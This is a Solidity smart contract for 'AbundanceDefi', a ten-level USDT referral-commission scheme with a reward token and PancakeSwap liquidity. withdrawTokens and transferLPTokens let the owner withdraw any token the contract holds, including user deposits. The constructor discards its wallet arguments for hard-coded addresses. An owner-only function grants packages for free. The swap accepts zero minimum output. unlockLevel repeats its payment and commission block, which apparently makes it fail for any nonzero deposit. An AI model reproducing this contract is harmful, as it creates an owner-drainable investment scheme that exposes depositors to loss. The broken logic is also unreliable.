// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.18;

// ContractUtils Library
library ContractUtils {
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

interface IPancakeRouter {
    function addLiquidity(address tokenA, address tokenB, uint amountADesired, uint amountBDesired, uint amountAMin, uint amountBMin, address to, uint deadline) external returns (uint amountA, uint amountB, uint liquidity);
    function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);
}

library SafeERC20 {
    using SafeMath for uint;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0), "SafeERC20: approve from non-zero to non-zero allowance");
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IERC20 token, bytes memory data) private {
        // Use the library name as a prefix for the function call
        require(ContractUtils.isContract(address(token)), "SafeERC20: call to non-contract");

        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");
        if (returndata.length > 0) { // Return data is optional
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
} // Ensure this brace closes SafeERC20

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

abstract contract ReentrancyGuard {
    bool internal locked;

    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }
}
contract AbundanceDefi is Ownable, ReentrancyGuard {
    using SafeMath for uint256;
    using SafeERC20 for IERC20;

    address private USDT_address = 0x55d398326f99059fF775485246999027B3197955;
    address private WealthToken_address = 0xd1E06C33eC1B1e8E1a549B9b352bF04D4aB445FF;

    IERC20 public USDTToken;
    IERC20 public WealthToken;
    IPancakeRouter public pancakeRouter;

    uint256 private constant MAX_DEPTH = 10;  // Set maximum depth to 1 for direct upline
    uint256 private constant MAX_ITERATIONS = 10; // Maximum iterations for loops

    uint256 public constant PERCENTS_DIVIDER = 1000;
    uint256 public constant ADMIN_FEE = 40;
    uint256 public constant ORIGIN_REFERRER_FEE = 750;
    uint256 public REFERRAL_BREAK_STEP = 4;
    uint256 public ADD_LIQUIDITY_STEP = 50 ether;
    bool public ADD_LIQUIDITY_ENABLED = true;
    uint256[] public REFERRAL_PERCENTS = [390, 120, 75, 40, 35, 30, 25, 20, 15, 10];
    uint256[] public LEVEL_PRICE = [2.5 ether, 5 ether, 10 ether, 25 ether, 50 ether, 100 ether, 250 ether, 500 ether, 1000 ether, 2500 ether];
    uint256[] public UNLOCK_TOKEN_DISTRIBUTION = [250 ether, 500 ether, 1_000 ether, 2_500 ether, 5_000 ether, 10_000 ether, 25_000 ether, 50_000 ether, 100_000 ether, 250_000 ether];
    uint256[] public REFERRAL_TOKEN_DISTRIBUTION = [15 ether, 25 ether, 50 ether, 100 ether, 200 ether, 500 ether, 1_250 ether, 2_000 ether, 4_000 ether, 10_000 ether];

    uint256 public totalParticipate;
    uint256 public totalUSDTReferral;
    uint256 public totalWealthTokenReferral;
    uint256 public totalWealthTokenJoinReward;
    uint256 public totalMissedUSDT;
    uint256 public totalUser;

    struct User {
        uint256 start;
        address referrer;
        address originReferrer;
        uint256 currentLevel;
        uint256 totalDeposit;
        uint256 directReferralCount;
        uint256 breakCount;
        uint256 totalJoinReward;
        uint256 totalTokenDirectReward;
        uint256 totalTokenRewardPayed;
        mapping(uint256 => address) directReferrals;
        mapping(uint256 => mapping(address => bool)) countedInLevel;
        uint256[10] levels;
        uint256[10] commissionsUSDT;
        uint256[10] teamTurnover;
        uint256[10] MissedUSDT;
        uint256[10] missedCommissionsUSDT;
        uint256 downlineCount;
    }

    mapping(address => User) public users;

    address payable public projectWallet;
    address payable public FeeWallet;
    address payable public marketingWallet;

    bool public init = false;

    event Newbie(address user);
    event NewParticipate(address indexed user, uint256 time);
    event NewReward(address indexed user, uint256 totalDeposit, uint256 reward, uint256 round, uint256 time);
    event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
    event referralTokenReward(address indexed referrer, address indexed referral, uint256 amount);
    event FeePayed(address indexed user, uint256 amount);
    event unlockTokenReward(address indexed user, uint256 amount);

   constructor(address payable _projectWallet, address payable _marketingWallet, address payable _feeWallet) {
    require(_projectWallet != address(0), "Project wallet address cannot be zero");
    require(_marketingWallet != address(0), "Marketing wallet address cannot be zero");
    require(_feeWallet != address(0), "Fee wallet address cannot be zero");

projectWallet = payable(0xefeA72adfB19b8e83718cE8846a94B08ee08e5a4);
marketingWallet = payable(0x035735Bb4C8496d5C4B8637F06326f6D6D47ebaf);
FeeWallet = payable(0x3AAb43608c86983e852C2129d24c2E9c5ccD9E7d);

        USDTToken = IERC20(USDT_address);
        WealthToken = IERC20(WealthToken_address);
        pancakeRouter = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    }

// initialized the Project
function launch() public onlyOwner {
    require(!init, "Contract already launched");
    init = true;
    users[projectWallet].start = block.timestamp;
    users[projectWallet].currentLevel = 9;
    pancakeRouter = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
}

// Structs for User and UserLevel data
struct UserLevelData {
    uint256[] levels;
    uint256[] commissionsUSDT;
    uint256[] missedCommissionsUSDT;
    uint256[] turnoverData;
}

struct UserData {
    address userAddress;
    uint256 start;
    uint256 level;
    uint256 totalDeposit;
    uint256 breakCount;
    address referrer;
    address originReferrer;
    address[] directReferrals;
    uint256 directReferralCount;
    }


// Function to transfer LP Tokens
function transferLPTokens(address lpTokenAddress, uint256 amount) external onlyOwner {
        IERC20 lpToken = IERC20(lpTokenAddress);
        require(lpToken.balanceOf(address(this)) >= amount, "Insufficient LP tokens");
        lpToken.safeTransfer(owner(), amount);
    }

    // Function to withdraw specific tokens from the contract
    function withdrawTokens(address tokenAddress, uint256 amount) external onlyOwner {
        IERC20 token = IERC20(tokenAddress);
        require(token.balanceOf(address(this)) >= amount, "Insufficient token balance");
        token.safeTransfer(owner(), amount);
    }

// Function to activate a package for a user with updated levels array handling
function activatePackageForUser(address userAddress, uint256 level, address upline) external onlyOwner {
    require(users[userAddress].start == 0, "User already activated");
    require(level >= 0 && level <= 9, "Invalid level");

    User storage user = users[userAddress];
    user.start = block.timestamp;
    user.currentLevel = level;
    user.referrer = upline;

        // Update downline count for direct upline
        address currentUpline = upline;
        uint256 levelIndex = 0;
        while (currentUpline != address(0) && levelIndex < MAX_DEPTH) {
            User storage uplineUser = users[currentUpline];

            // Cache frequently accessed fields in memory
            address uplineReferrer = uplineUser.referrer;

            if (!uplineUser.countedInLevel[levelIndex][userAddress]) {
                uplineUser.levels[levelIndex]++;
                uplineUser.countedInLevel[levelIndex][userAddress] = true;
            }

            currentUpline = uplineReferrer;
            levelIndex++;
        }

    // Update the referrer's direct referrals
    User storage referrerUser = users[upline];
    referrerUser.directReferrals[referrerUser.directReferralCount] = userAddress;
    referrerUser.directReferralCount++;

    _updateUplineTurnover(upline, LEVEL_PRICE[level]);
    emit Newbie(userAddress); // Review the necessity of all data in this event
}


// Function to upgrade a member's package
function upgradeMemberPackage(address member, uint256 newPackageLevel, bool isPaid) public {
    require(users[member].currentLevel < newPackageLevel, "Already at this level or higher");
    require(newPackageLevel >= 0 && newPackageLevel <= 9, "Invalid level");

    if (isPaid) {
        // Paid upgrade logic
        require(msg.sender != owner(), "Owner cannot use paid upgrade");
        require(USDTToken.allowance(msg.sender, address(this)) >= LEVEL_PRICE[newPackageLevel], "Low allowance for USDT");
        USDTToken.safeTransferFrom(msg.sender, address(this), LEVEL_PRICE[newPackageLevel]);
    } else {
        // Only owner can perform an administrative upgrade
        require(msg.sender == owner(), "Only owner can perform admin upgrade");
    }

    users[member].currentLevel = newPackageLevel;
}

function unlockLevel(address _upline, uint256 _level, uint256 _amount) public noReentrant {
    require(init, "Not Started Yet");
    User storage user = users[msg.sender];
    require(_level >= 0 && _level <= 9, "Enter correct level");

    if (user.start == 0) {
        user.start = block.timestamp;
        user.referrer = _upline;
    }

    require(_amount + user.totalDeposit == LEVEL_PRICE[_level], "Wrong activate amount");
    require(_amount <= USDTToken.allowance(msg.sender, address(this)), "Low allowance for USDT");

    USDTToken.safeTransferFrom(msg.sender, address(this), _amount);
    user.currentLevel = _level;
    user.totalDeposit += _amount;

   // Using a memory cache for user data to reduce storage reads
    address currentUpline = user.referrer;
    uint256 levelIndex = 0;
    while (currentUpline != address(0) && levelIndex < 10) {
        User storage uplineUser = users[currentUpline];
        // Caching frequently accessed fields in memory
        address uplineReferrer = uplineUser.referrer;

        // Check if the user has already been counted in this level for the upline
        if (!uplineUser.countedInLevel[levelIndex][msg.sender]) {
            uplineUser.levels[levelIndex]++;
            uplineUser.countedInLevel[levelIndex][msg.sender] = true;
        }

        // Perform updates using the storage reference
        // Here we use the cached 'uplineReferrer' and 'uplineCurrentLevel' instead of accessing storage
        // ... Any other logic that requires 'uplineReferrer' or 'uplineCurrentLevel' ...

        // Use cached value for the next iteration
        currentUpline = uplineReferrer;
        levelIndex++;
    }

    _updateUplineTurnover(user.referrer, _amount);
    _payCommission(_amount);

    // Check for the correct amount to activate the level
    require(_amount + user.totalDeposit == LEVEL_PRICE[_level], "Wrong activate amount");
    require(_amount <= USDTToken.allowance(msg.sender, address(this)), "Low allowance for USDT");

    // Transfer the funds and update the user's level and total deposit
    USDTToken.safeTransferFrom(msg.sender, address(this), _amount);
    user.currentLevel = _level;
    user.totalDeposit += _amount;

    // Handle commissions, marketing fee, and token rewards
    _setUpline(_upline); // This might be redundant if _upline is already set above
    _updateUplineTurnover(user.referrer, _amount);
    _payCommission(_amount);

    uint256 MarketingFee = _amount * ADMIN_FEE / PERCENTS_DIVIDER;
    USDTToken.safeTransfer(marketingWallet, MarketingFee);
    emit FeePayed(msg.sender, MarketingFee);

    uint256 tokenJoinReward = UNLOCK_TOKEN_DISTRIBUTION[_level] - user.totalJoinReward;
    user.totalJoinReward += tokenJoinReward;
    totalWealthTokenJoinReward += tokenJoinReward;
    WealthToken.safeTransfer(msg.sender, tokenJoinReward);
    emit unlockTokenReward(msg.sender, tokenJoinReward);

    // Handle liquidity addition if necessary
    if (getContractUSDTBalance() >= ADD_LIQUIDITY_STEP && ADD_LIQUIDITY_ENABLED) {
        _handleAddLiquidity(getContractUSDTBalance());
    }

    totalUser++; // Consider if this should only increment for new users
    emit NewParticipate(msg.sender, block.timestamp);
}

function _setUpline(address _upline) private {
    address currentUpline = _upline;
    uint256 iterations = 0;

    while (currentUpline != address(0) && iterations < MAX_ITERATIONS) {
        User storage uplineUser = users[currentUpline];

        if (uplineUser.start > 0 || currentUpline == projectWallet) {
            uplineUser.directReferralCount++;
            if (users[msg.sender].originReferrer == address(0)) {
                users[msg.sender].originReferrer = currentUpline;
            }
            if (uplineUser.directReferralCount % REFERRAL_BREAK_STEP == 0) {
                address newUpline = uplineUser.directReferrals[uplineUser.breakCount];
                uplineUser.breakCount++;
                if (newUpline != address(0)) {
                    currentUpline = newUpline;
                } else {
                    currentUpline = projectWallet;
                }
            } else {
                users[msg.sender].referrer = currentUpline;
                uplineUser.directReferrals[uplineUser.directReferralCount - 1] = msg.sender;
                break; // Terminate the loop as we've set the referrer
            }
        } else {
            revert("Invalid referrer address");
        }
        iterations++;
    }

    require(iterations < MAX_ITERATIONS, "Exceeded max iterations in _setUpline");
}
    // Internal function to update the upline turnover
    function _updateUplineTurnover(address upline, uint256 depositAmount) internal {
        for (uint256 i = 0; i < REFERRAL_PERCENTS.length; i++) {
            if (upline != address(0)) {
                users[upline].teamTurnover[i] += depositAmount;
                upline = users[upline].referrer;
            } else break;
        }
    }

    // Public function to manually add liquidity
    function manualAddLiquidity() public onlyOwner {
        if(getContractUSDTBalance() >= ADD_LIQUIDITY_STEP && ADD_LIQUIDITY_ENABLED){
            _handleAddLiquidity(getContractUSDTBalance());
        }
    }

    // Internal function to handle adding liquidity
    function _handleAddLiquidity(uint256 contractUSDTBalance) private {
        uint256 amountUSDTToSpend = contractUSDTBalance / 2;
        USDTToken.approve(address(pancakeRouter), amountUSDTToSpend);

        address[] memory path = new address[](2);
        path[0] = address(USDT_address);
        path[1] = address(WealthToken_address);

        uint[] memory amounts = pancakeRouter.swapExactTokensForTokens(amountUSDTToSpend, 0, path, address(this), block.timestamp + 10 minutes);

        uint256 amountToken = amounts[1];
        uint256 amountUSDT = USDTToken.balanceOf(address(this));
        WealthToken.approve(address(pancakeRouter), amountToken);
        USDTToken.approve(address(pancakeRouter), amountUSDT);

        pancakeRouter.addLiquidity(address(WealthToken_address), address(USDT_address), amountToken, amountUSDT, 0, 0, address(this), block.timestamp + 10 minutes);
    }

    // Internal function to pay commissions
    function _payCommission(uint256 _amount) internal {
        User storage user = users[msg.sender];
        address upline = user.referrer;
        address originUpline = user.originReferrer;
        uint256 resCommission;
        uint256 amountRef;
        uint256 finalOriginUSDTCommission;
        for (uint256 i = 0; i < REFERRAL_PERCENTS.length; i++) {
            finalOriginUSDTCommission = _amount;
            if(upline != address(0) && user.currentLevel > users[upline].currentLevel && LEVEL_PRICE[users[upline].currentLevel] > user.totalDeposit){
                finalOriginUSDTCommission = LEVEL_PRICE[users[upline].currentLevel] - user.totalDeposit;
            }
            amountRef = finalOriginUSDTCommission * REFERRAL_PERCENTS[i] / PERCENTS_DIVIDER;
            if (upline != address(0) && LEVEL_PRICE[users[upline].currentLevel] > user.totalDeposit) {
                if(i == 0){
                    uint256 WealthTokenCommission = REFERRAL_TOKEN_DISTRIBUTION[user.currentLevel] - user.totalTokenDirectReward;
                    if(user.currentLevel > users[upline].currentLevel){
                        WealthTokenCommission = REFERRAL_TOKEN_DISTRIBUTION[users[upline].currentLevel] - user.totalTokenDirectReward;
                    }
                    if(upline != originUpline){
                        uint256 WealthTokenCommissionOrigin = WealthTokenCommission * ORIGIN_REFERRER_FEE / PERCENTS_DIVIDER;
                        WealthTokenCommission = WealthTokenCommission - WealthTokenCommissionOrigin;
                        user.totalTokenDirectReward += WealthTokenCommissionOrigin;
                        users[originUpline].totalTokenRewardPayed += WealthTokenCommissionOrigin;
                        totalWealthTokenReferral += WealthTokenCommissionOrigin;
                        WealthToken.safeTransfer(originUpline, WealthTokenCommissionOrigin);
                        emit referralTokenReward(originUpline, msg.sender, WealthTokenCommissionOrigin);
                    }
                    user.totalTokenDirectReward +=  WealthTokenCommission;
                    users[upline].totalTokenRewardPayed += WealthTokenCommission;
                    WealthToken.safeTransfer(upline, WealthTokenCommission);
                    totalWealthTokenReferral += WealthTokenCommission;
                    emit referralTokenReward(upline, msg.sender, WealthTokenCommission);
                }
                users[upline].commissionsUSDT[i] += amountRef;
                USDTToken.safeTransfer(upline, amountRef);
                totalUSDTReferral += amountRef;
                emit RefBonus(upline, msg.sender, i, amountRef);

                if(user.currentLevel > users[upline].currentLevel){
                    uint256 restLevelAmount = (_amount * REFERRAL_PERCENTS[i] / PERCENTS_DIVIDER) - amountRef;
                    totalMissedUSDT += restLevelAmount;
                    users[upline].MissedUSDT[i] += restLevelAmount;
                    resCommission += restLevelAmount;
                }

                upline = users[upline].referrer;
            }else{
                totalMissedUSDT += amountRef;
                users[upline].MissedUSDT[i] += amountRef;
                resCommission += amountRef;

                if(upline != address(0)){
                    upline = users[upline].referrer;
                }
            }
        }
        if(resCommission > 0){
            USDTToken.safeTransfer(FeeWallet, resCommission);
        }
    }
  // Function to get the contract's USDT balance
    function getContractUSDTBalance() public view returns (uint256) {
        return USDTToken.balanceOf(address(this));
    }

    // Function to get the contract's WealthToken balance
    function getContractWealthTokenBalance() public view returns (uint256) {
        return WealthToken.balanceOf(address(this));
    }

    // Function to get a user's total USDT earnings
    function getUserTotalUSDTEarn(address userAddress) public view returns (uint256) {
        uint256 totalUSDTCommissions;
        for(uint256 i = 0; i < 10; i++) {
            totalUSDTCommissions += users[userAddress].commissionsUSDT[i];
        }
        return totalUSDTCommissions;
    }

    // Function to get a user's total missed USDT
    function getUserTotalMissedUSDT(address userAddress) public view returns (uint256) {
        uint256 totalUSDTMissed;
        for(uint256 i = 0; i < 10; i++) {
            totalUSDTMissed += users[userAddress].MissedUSDT[i];
        }
        return totalUSDTMissed;
    }

    // Function to get a user's total WealthToken earnings
    function getUserTotalWealthTokenEarn(address userAddress) public view returns (uint256) {
        return users[userAddress].totalTokenRewardPayed;
    }

    // Function to get a user's total team turnover
    function getUserTotalTeamTurnover(address userAddress) public view returns (uint256) {
        uint256 teamTurnover;
        for(uint256 i = 0; i < 10; i++) {
            teamTurnover += users[userAddress].teamTurnover[i];
        }
        return teamTurnover;
    }

    // Function to get a user's referrer
    function getUserReferrer(address userAddress) public view returns (address) {
        return users[userAddress].referrer;
    }

    // Function to get a user's direct referral mapping
    function getUserDirectReferralMapping(address userAddress, uint256 _index) public view returns (address) {
        return users[userAddress].directReferrals[_index];
    }

    // Function to get a user's downline count
    function getUserDownlineCount(address userAddress) public view returns (uint256[10] memory referrals) {
        return users[userAddress].levels;
    }

    // Function to get a user's missed USDT
    function getUserMissedUSDT(address userAddress) public view returns (uint256[10] memory missed) {
        return users[userAddress].MissedUSDT;
    }

    // Function to get a user's team turnover
    function getUserTeamTurnover(address userAddress) public view returns (uint256[10] memory turnover) {
        return users[userAddress].teamTurnover;
    }

    // Function to get a user's USDT commissions
    function getUserUSDTCommissions(address userAddress) public view returns (uint256[10] memory commissions) {
        return users[userAddress].commissionsUSDT;
    }

    // Function to get a user's total referrals
    function getUserTotalReferrals(address userAddress) public view returns (uint256) {
        return users[userAddress].levels[0];
    }

    // Function to get a user's total referrals count
    function getUserTotalReferralsCount(address userAddress) public view returns (uint256[10] memory count) {
        return users[userAddress].levels;
    }

    // Function to get a user's total downline
    function getUserTotalDownline(address userAddress) public view returns (uint256) {
        uint256 downlineCount;
        for(uint256 i = 0; i < 10; i++) {
            downlineCount += users[userAddress].levels[i];
        }
        return downlineCount;
    }

    // Function to get site info
    function getSiteInfo() public view returns (
        uint256 _totalInvested,
        uint256 _totalUSDTBonus,
        uint256 _totalWealthTokenBonus,
        uint256 _totalUser,
        uint256 _contractUSDTBalance,
        uint256 _contractWealthTokenBalance,
        uint256 _totalMissedUSDT,
        uint256 _totalWealthTokenJoinReward,
        uint256 _totalWealthTokenReward
    ) {
        return (
            totalParticipate, 
            totalUSDTReferral,
            totalWealthTokenReferral, 
            totalUser, 
            getContractUSDTBalance(), 
            getContractWealthTokenBalance(), 
            totalMissedUSDT, 
            totalWealthTokenJoinReward, 
            totalWealthTokenReferral + totalWealthTokenJoinReward
        );
    }

    // Function to get user info
    function getUserInfo(address userAddress) public view returns (
        uint256 startCheckpoint,
        uint256 downlineCount,
        uint256 userTotalUSDTCommissions,
        uint256 userTotalWealthTokenCommissions,
        uint256 userTotalMissedUSDT,
        uint256 currentLevel,
        uint256 totalDeposit
    ) {
        return (
            users[userAddress].start,
            getUserTotalDownline(userAddress),
            getUserTotalUSDTEarn(userAddress),
            getUserTotalWealthTokenEarn(userAddress),
            getUserTotalMissedUSDT(userAddress),
            users[userAddress].currentLevel,
            users[userAddress].totalDeposit
        );
    }

    // Function to get user total WealthToken reward
    function getUserTotalWealthTokenReward(address userAddress) public view returns (uint256) {
        return getUserTotalWealthTokenEarn(userAddress) + users[userAddress].totalJoinReward;
    }

    // Function to get require amount to activate
    function getRequireAmountToActivate(address userAddress) public view returns (uint256) {
        uint256 amount;
        User storage user = users[userAddress];
        amount = LEVEL_PRICE[user.currentLevel] - user.totalDeposit;
        return amount;
    }

    // Function to set add liquidity step
    function setAddLiquidityStep(uint256 amount) public onlyOwner {
        ADD_LIQUIDITY_STEP = amount;
    }

    // Function to set add liquidity status
    function setAddLiquidityStatus(bool status) public onlyOwner {
        ADD_LIQUIDITY_ENABLED = status;
    }
}